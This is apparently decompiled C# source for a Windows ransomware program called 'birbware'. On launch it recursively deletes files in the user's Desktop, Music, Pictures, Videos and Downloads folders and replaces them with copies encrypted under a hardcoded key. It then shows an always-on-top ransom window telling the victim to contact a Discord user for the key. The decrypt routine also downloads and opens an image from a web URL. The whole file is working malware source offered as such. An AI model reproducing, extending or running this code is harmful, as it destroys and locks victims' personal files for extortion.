using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace ransom;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Button decrypt;

	private TextBox keyBox;

	private Label label2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string userName = Environment.UserName;
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		list.Add("C:\\Users\\" + userName + "\\Music\\");
		list.Add("C:\\Users\\" + userName + "\\Pictures\\");
		list.Add("C:\\Users\\" + userName + "\\Videos\\");
		list.Add("C:\\Users\\" + userName + "\\Downloads\\");
		for (int i = 0; i < list.Count; i++)
		{
			string[] files = Directory.GetFiles(list[i], "*.*", SearchOption.AllDirectories);
			for (int j = 0; j < files.Length; j++)
			{
				string s = "apaowjdsodiuj9(/)=(/14jlqksjd";
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				byte[] bytes2 = File.ReadAllBytes(files[j]);
				try
				{
					File.Delete(files[j]);
					byte[] bytes3 = encryptBytes(bytes, bytes2);
					File.WriteAllBytes(files[j] + ".birbb", bytes3);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private byte[] encryptBytes(byte[] pass, byte[] bytes)
	{
		byte[] array = new byte[bytes.Length];
		for (int i = 0; i < bytes.Length; i++)
		{
			array[i] = (byte)(bytes[i] + pass[i % pass.Length]);
		}
		return array;
	}

	private byte[] decryptBytes(byte[] pass, byte[] bytes)
	{
		byte[] array = new byte[bytes.Length];
		for (int i = 0; i < bytes.Length; i++)
		{
			array[i] = (byte)(bytes[i] - pass[i % pass.Length]);
		}
		return array;
	}

	private void decrypt_Click(object sender, EventArgs e)
	{
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		string userName = Environment.UserName;
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		list.Add("C:\\Users\\" + userName + "\\Music\\");
		list.Add("C:\\Users\\" + userName + "\\Pictures\\");
		list.Add("C:\\Users\\" + userName + "\\Videos\\");
		list.Add("C:\\Users\\" + userName + "\\Downloads\\");
		for (int i = 0; i < list.Count; i++)
		{
			string[] files = Directory.GetFiles(list[i], "*.*", SearchOption.AllDirectories);
			for (int j = 0; j < files.Length; j++)
			{
				byte[] bytes = Encoding.ASCII.GetBytes(((Control)keyBox).get_Text());
				byte[] bytes2 = File.ReadAllBytes(files[j]);
				try
				{
					File.Delete(files[j]);
					byte[] bytes3 = decryptBytes(bytes, bytes2);
					File.WriteAllBytes(files[j].Remove(files[j].Length - 6), bytes3);
				}
				catch (Exception)
				{
				}
			}
		}
		Form1 form = new Form1();
		((Control)form).Hide();
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("http://3.bp.blogspot.com/_L8lQFEnRero/S9dOMaxwqXI/AAAAAAAAADs/e8rLKHsRH3s/s1600/76.jpg", "C:\\Users\\" + userName + "\\Desktop\\birb.png");
		}
		catch (Exception)
		{
		}
		Process.Start("C:\\Users\\" + userName + "\\Desktop\\birb.png");
		MessageBox.Show("thanku for using birbware, i hope to c u again ;)");
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0191: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		//IL_0292: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		decrypt = new Button();
		keyBox = new TextBox();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(171, 232));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(28, 13));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Key:");
		((Control)decrypt).set_Location(new Point(461, 226));
		((Control)decrypt).set_Name("decrypt");
		((Control)decrypt).set_Size(new Size(75, 23));
		((Control)decrypt).set_TabIndex(3);
		((Control)decrypt).set_Text("Decrypt!");
		((ButtonBase)decrypt).set_UseVisualStyleBackColor(true);
		((Control)decrypt).add_Click((EventHandler)decrypt_Click);
		((Control)keyBox).set_Location(new Point(205, 228));
		((Control)keyBox).set_Name("keyBox");
		((Control)keyBox).set_Size(new Size(250, 20));
		((Control)keyBox).set_TabIndex(4);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Comic Sans MS", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(695, 140));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("uh-oh you just got urself some birbware\r\nif u wanna get rid of this birbware u can send nxf#3688 \r\nsome spicy mems on discord and maybe he will \r\ngive you the encryption key \u00af\\_(ツ)_/\u00af");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(710, 260));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)keyBox);
		((Control)this).get_Controls().Add((Control)(object)decrypt);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_ForeColor(Color.Red);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MaximumSize(new Size(726, 299));
		((Control)this).set_MinimumSize(new Size(726, 299));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("birbware");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
